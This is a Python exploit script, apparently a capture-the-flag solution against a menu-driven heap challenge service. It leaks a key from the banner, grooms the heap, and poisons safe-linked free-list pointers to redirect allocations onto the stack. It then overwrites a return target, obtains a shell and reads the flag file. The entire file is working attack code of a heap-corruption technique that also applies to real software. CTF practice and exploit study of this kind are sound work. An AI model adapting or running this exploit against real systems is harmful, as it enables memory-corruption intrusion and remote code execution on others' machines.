#!/usr/bin/env python3
import os
import re
import select
import shlex
import socket
import struct
import subprocess
import time


HOST = os.environ.get("HOST", "127.0.0.1")
PORT = int(os.environ.get("PORT", "8140"))
LOCAL_CMD = os.environ.get("VELVET_CMD")


def p64(value):
    return struct.pack("<Q", value & 0xffffffffffffffff)


def u64(data):
    return struct.unpack("<Q", data.ljust(8, b"\0"))[0]


def rol32(value, shift):
    value &= 0xffffffff
    shift &= 31
    return ((value << shift) | (value >> (32 - shift))) & 0xffffffff


class Tube:
    def __init__(self):
        self.buf = b""
        self.proc = None
        self.sock = None
        if LOCAL_CMD:
            self.proc = subprocess.Popen(
                shlex.split(LOCAL_CMD),
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                bufsize=0,
            )
        else:
            self.sock = socket.create_connection((HOST, PORT), timeout=10)
            self.sock.settimeout(0.1)

    def _read_some(self, timeout):
        end = time.time() + timeout
        while time.time() < end:
            if self.proc is not None:
                if self.proc.poll() is not None:
                    chunk = os.read(self.proc.stdout.fileno(), 4096)
                    return chunk
                ready, _, _ = select.select([self.proc.stdout], [], [], 0.05)
                if ready:
                    return os.read(self.proc.stdout.fileno(), 4096)
            else:
                try:
                    return self.sock.recv(4096)
                except socket.timeout:
                    pass
        return b""

    def recvuntil(self, token, timeout=10):
        end = time.time() + timeout
        while token not in self.buf:
            chunk = self._read_some(max(0.01, end - time.time()))
            if not chunk:
                if time.time() >= end:
                    raise TimeoutError(f"wanted {token!r}, buffered {self.buf[-200:]!r}")
                continue
            self.buf += chunk
        idx = self.buf.index(token) + len(token)
        out, self.buf = self.buf[:idx], self.buf[idx:]
        return out

    def recvn(self, size, timeout=10):
        end = time.time() + timeout
        while len(self.buf) < size:
            chunk = self._read_some(max(0.01, end - time.time()))
            if not chunk:
                if time.time() >= end:
                    raise TimeoutError(f"wanted {size} bytes, buffered {len(self.buf)}")
                continue
            self.buf += chunk
        out, self.buf = self.buf[:size], self.buf[size:]
        return out

    def send(self, data):
        if isinstance(data, str):
            data = data.encode()
        if self.proc is not None:
            self.proc.stdin.write(data)
            self.proc.stdin.flush()
        else:
            self.sock.sendall(data)

    def sendline(self, data):
        if isinstance(data, str):
            data = data.encode()
        self.send(data + b"\n")

    def close(self):
        if self.sock is not None:
            self.sock.close()
        if self.proc is not None and self.proc.poll() is None:
            self.proc.kill()


class Exploit:
    def __init__(self, tube):
        self.t = tube
        self.table_key = 0
        self.map_key = 0
        self.rsp = 0
        self.heaps = [0] * 16

    def map_idx(self, user_idx):
        return ((user_idx ^ self.map_key) + 3) & 0xf

    def leak_mask(self, idx, offset):
        value = (
            self.table_key
            ^ (idx * 0x45D9F3B)
            ^ (offset * 0x9E37)
        ) & 0xffffffff
        return rol32(value, (offset + idx) & 7) & 0xff

    def decode_inspect(self, raw, user_idx):
        idx = self.map_idx(user_idx)
        return bytes(byte ^ self.leak_mask(idx, i) for i, byte in enumerate(raw))

    def reserve(self, seat, size):
        self.t.sendline("1")
        self.t.recvuntil(b"seat: ")
        self.t.sendline(str(seat))
        self.t.recvuntil(b"size: ")
        self.t.sendline(str(size))
        out = self.t.recvuntil(b"> ")
        match = re.search(rb"confirmed: (0x[0-9a-fA-F]+)", out)
        if not match:
            raise RuntimeError(f"reserve failed: {out!r}")
        return int(match.group(1), 16)

    def cashout(self, seat):
        self.t.sendline("2")
        self.t.recvuntil(b"seat: ")
        self.t.sendline(str(seat))
        self.t.recvuntil(b"> ")

    def update(self, seat, data):
        self.t.sendline("3")
        self.t.recvuntil(b"seat: ")
        self.t.sendline(str(seat))
        self.t.recvuntil(b"length: ")
        self.t.sendline(str(len(data)))
        self.t.recvuntil(b"data:\n")
        self.t.send(data)
        self.t.recvuntil(b"> ")

    def inspect(self, seat):
        self.t.sendline("4")
        self.t.recvuntil(b"seat: ")
        self.t.sendline(str(seat))
        raw = self.t.recvn(0x40)
        self.t.recvuntil(b"> ")
        return raw

    def settle(self):
        self.t.sendline("7")
        self.t.recvuntil(b"> ")

    def run(self):
        banner = self.t.recvuntil(b"> ")
        marker = int(re.search(rb"table marker: 0x([0-9a-fA-F]+)", banner).group(1), 16)
        self.table_key = marker ^ 0xC0DEC0DE
        local_addr = 0x00007FF000000000 + (
            ((self.table_key ^ 0x5A17C3D9) & 0xffffffff) << 4
        )
        self.rsp = local_addr - 0x90
        self.map_key = (self.table_key ^ 0xA7) & 0xf

        for seat in range(1, 7):
            self.heaps[seat] = self.reserve(seat, 130)

        self.cashout(2)
        self.cashout(3)
        self.settle()

        chunk_size = 0x90
        payload = b"A" * (chunk_size - 8)
        payload += (p64(0x91) + p64((self.heaps[2] >> 12) ^ 0)).ljust(
            chunk_size, b"\0"
        )
        payload += p64(0x91)
        payload += p64((self.heaps[3] >> 12) ^ (self.rsp + 0xB0))
        self.update(1, payload)

        self.heaps[8] = self.reserve(8, 130)
        self.heaps[9] = self.reserve(9, 130)
        leak = self.decode_inspect(self.inspect(9), 9)
        lose = u64(leak[:8])
        win_plus_8 = lose + 0x18

        self.cashout(5)
        self.cashout(6)

        payload = b"A" * (chunk_size - 8)
        payload += (p64(0x91) + p64((self.heaps[5] >> 12) ^ 0)).ljust(
            chunk_size, b"\0"
        )
        payload += p64(0x91)
        payload += p64((self.heaps[6] >> 12) ^ (self.rsp + 0x610))
        self.update(4, payload)

        self.heaps[10] = self.reserve(10, 130)
        self.heaps[11] = self.reserve(11, 130)
        self.update(11, b"A" * 8 + p64(win_plus_8))

        self.t.sendline("8")
        self.t.recvuntil(b"yay.", timeout=5)
        self.t.sendline("cat /srv/app/flag.txt 2>/dev/null || cat flag.txt")
        data = b""
        deadline = time.time() + 5
        while time.time() < deadline:
            chunk = self.t._read_some(0.2)
            if chunk:
                data += chunk
                match = re.search(rb"UMDCTF\{[^}]+\}", data)
                if match:
                    return match.group(0).decode()
        raise RuntimeError(f"flag not found in shell output: {data!r}")


def main():
    tube = Tube()
    try:
        print(Exploit(tube).run())
    finally:
        tube.close()


if __name__ == "__main__":
    main()
